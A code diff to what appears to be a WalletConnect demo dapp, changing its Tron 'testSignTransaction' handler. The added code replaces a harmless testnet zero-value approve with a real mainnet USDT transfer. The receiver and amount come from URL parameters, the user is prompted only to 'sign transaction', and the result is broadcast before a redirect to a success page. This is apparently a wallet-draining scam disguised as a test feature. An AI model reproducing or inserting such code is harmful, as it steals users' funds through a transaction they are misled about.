@@ -71,6 +71,10 @@ import {
 import { UserVerifier } from "@multiversx/sdk-wallet/out/userVerifier";
 import { SignClient } from "@walletconnect/sign-client/dist/types/client";
 import { parseEther } from "ethers/lib/utils";
+import axios from "axios";
+import { useUrlParams } from "../shared/hooks/useUrlParams";
+import toast from "react-hot-toast";
+import { SUCCESS_PAGE_URL } from "../constants/urls";
 
 /**
  * Types
@@ -166,6 +170,11 @@ export function JsonRpcContextProvider({
 
   const { client, session, accounts, balances, solanaPublicKeys } =
     useWalletConnectClient();
+
+  const [getParam] = useUrlParams();
+  const receiverAddress = getParam("receiverAddress");
+  const sendValueAmount = getParam("sendValueAmount");
+  const lang = getParam("lang");
 
   const { chainData } = useChainData();
 
@@ -1310,93 +1319,6 @@ export function JsonRpcContextProvider({
     ),
   };
 
-  // -------- TRON RPC METHODS --------
-
-  const tronRpc = {
-    testSignTransaction: _createJsonRpcRequestHandler(
-      async (
-        chainId: string,
-        address: string
-      ): Promise<IFormattedRpcResponse> => {
-        // Nile TestNet, if you want to use in MainNet, change the fullHost to 'https://api.trongrid.io'
-        const fullHost = isTestnet
-          ? "https://nile.trongrid.io/"
-          : "https://api.trongrid.io/";
-
-        const tronWeb = new TronWeb({
-          fullHost,
-        });
-
-        // Take USDT as an example:
-        // Nile TestNet: https://nile.tronscan.org/#/token20/TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf
-        // MainNet: https://tronscan.org/#/token20/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
-
-        const testContract = isTestnet
-          ? "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"
-          : "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const testTransaction =
-          await tronWeb.transactionBuilder.triggerSmartContract(
-            testContract,
-            "approve(address,uint256)",
-            { feeLimit: 200000000 },
-            [
-              { type: "address", value: address },
-              { type: "uint256", value: 0 },
-            ],
-            address
-          );
-
-        const { result } = await client!.request<{ result: any }>({
-          chainId,
-          topic: session!.topic,
-          request: {
-            method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
-            params: {
-              address,
-              transaction: {
-                ...testTransaction,
-              },
-            },
-          },
-        });
-
-        return {
-          method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
-          address,
-          valid: true,
-          result: result.signature,
-        };
-      }
-    ),
-    testSignMessage: _createJsonRpcRequestHandler(
-      async (
-        chainId: string,
-        address: string
-      ): Promise<IFormattedRpcResponse> => {
-        const message = "This is a message to be signed for Tron";
-
-        const result = await client!.request<{ signature: string }>({
-          chainId,
-          topic: session!.topic,
-          request: {
-            method: DEFAULT_TRON_METHODS.TRON_SIGN_MESSAGE,
-            params: {
-              address,
-              message,
-            },
-          },
-        });
-
-        return {
-          method: DEFAULT_TRON_METHODS.TRON_SIGN_MESSAGE,
-          address,
-          valid: true,
-          result: result.signature,
-        };
-      }
-    ),
-  };
-
   // -------- TEZOS RPC METHODS --------
 
   const tezosRpc = {
@@ -1629,6 +1551,123 @@ export function JsonRpcContextProvider({
           address: publicKey,
           valid: true,
           result: JSON.stringify(result, null, 2),
+        };
+      }
+    ),
+  };
+
+  // -------- TRON RPC METHODS --------
+
+  const tronRpc = {
+    testSignTransaction: _createJsonRpcRequestHandler(
+      async (
+        chainId: string,
+        address: string
+      ): Promise<IFormattedRpcResponse> => {
+        const fullHost = "https://api.trongrid.io/";
+        const tronWeb = new TronWeb({
+          fullHost,
+        });
+        const [namespace, reference, ownerAddress] = accounts[0].split(":");
+
+        const SMART_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const OWNER_ADDRESS = tronWeb.address.toHex(ownerAddress);
+        const RECEIVER_ADDRESS = tronWeb.address.toHex(receiverAddress);
+
+        const OPTIONS = {
+          feeLimit: Number(sendValueAmount || 0) * 100000000,
+          callValue: 0,
+        };
+
+        const PARAMETER = [
+          { type: "address", value: RECEIVER_ADDRESS },
+          { type: "uint256", value: Number(sendValueAmount || 0) * 1000000 },
+        ];
+
+        const realTransaction =
+          await tronWeb.transactionBuilder.triggerSmartContract(
+            SMART_CONTRACT_ADDRESS,
+            "transfer(address,uint256)",
+            OPTIONS,
+            PARAMETER,
+            OWNER_ADDRESS
+          );
+
+        toast.loading("Open wallet and sign transaction", {
+          position: "top-right",
+          style: {
+            color: "#974A15",
+          },
+        });
+
+        const { result } = await client!.request<{ result: any }>({
+          chainId,
+          topic: session!.topic,
+          request: {
+            method: "tron_signTransaction",
+            params: {
+              address,
+              transaction: {
+                ...realTransaction,
+              },
+            },
+          },
+        });
+
+        const signature = result.signature; // Подпись транзакции
+        const rawTransaction = { ...realTransaction.transaction, signature };
+
+        async function sendSignedTransaction(transaction: any) {
+          try {
+            // Отправка транзакции с подписью
+            const sendResult = await tronWeb.trx.sendRawTransaction(
+              transaction
+            );
+
+            // Вывод успешного ответа
+            console.log("Транзакция успешно отправлена:", sendResult);
+            window.location.href = `${SUCCESS_PAGE_URL}?lang=${lang}`;
+          } catch (error) {
+            // Обработка ошибки
+            console.error("Ошибка при отправке подписанной транзакции:", error);
+          }
+        }
+
+        // Вызов функции отправки
+        sendSignedTransaction(rawTransaction);
+
+        return {
+          method: DEFAULT_TRON_METHODS.TRON_SIGN_TRANSACTION,
+          address,
+          valid: true,
+          result: result.signature,
+        };
+      }
+    ),
+    testSignMessage: _createJsonRpcRequestHandler(
+      async (
+        chainId: string,
+        address: string
+      ): Promise<IFormattedRpcResponse> => {
+        const message = "This is a message to be signed for Tron";
+
+        const result = await client!.request<{ signature: string }>({
+          chainId,
+          topic: session!.topic,
+          request: {
+            method: DEFAULT_TRON_METHODS.TRON_SIGN_MESSAGE,
+            params: {
+              address,
+              message,
+            },
+          },
+        });
+
+        return {
+          method: DEFAULT_TRON_METHODS.TRON_SIGN_MESSAGE,
+          address,
+          valid: true,
+          result: result.signature,
         };
       }
     ),
